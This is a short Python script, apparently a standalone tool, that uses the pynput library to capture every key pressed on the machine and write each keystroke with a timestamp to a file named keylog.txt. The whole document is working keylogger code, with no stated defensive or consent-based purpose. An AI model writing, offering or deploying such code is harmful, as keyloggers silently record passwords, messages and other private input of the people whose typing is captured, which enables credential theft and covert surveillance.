import logging

# Configure logging
logging.basicConfig(filename='keylog.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

def on_key_press(key):
    try:
        logging.info('Key pressed: {0}'.format(key.char))
    except AttributeError:
        logging.info('Special key pressed: {0}'.format(key))

if __name__ == "__main__":
    from pynput import keyboard
    
    # Start listening to key events
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()
